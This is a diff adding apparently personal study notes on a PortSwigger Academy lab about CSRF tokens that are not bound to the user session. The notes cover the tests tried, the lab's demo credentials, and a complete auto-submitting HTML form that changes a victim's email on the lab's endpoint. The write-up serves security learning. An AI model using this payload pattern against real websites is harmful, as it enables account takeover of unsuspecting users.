@@ -1,0 +1,33 @@
+Lab #4: CSRF where token is not tied to user session
+
+Target: change the viewer's email address
+
+
+This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
+Hint: 
+   
+    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
+
+    You can log in to your own account using the following credentials: wiener:peter
+
+
+Analysis:
+
+  test1: change csrf -> invalid csrf value
+  test2: remove csrf-> missing csrf
+  test3: change request to get -> not working
+  test4:    check if the tokens are bind to the ids:
+            load the form and store the csrf token, login with another account and test the request with the first csrf token value. 
+
+
+  <html>
+                    <body>
+                        <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="POST">
+                            <input type="hidden" name="email" value="pwned@evil-user.net" />
+                            <input type="hidden" name="csrf" value="your-own-not-used-csrf-token" />
+                        </form>
+                        <script>
+                            document.forms[0].submit();
+                        </script>
+                    </body>
+    </html>
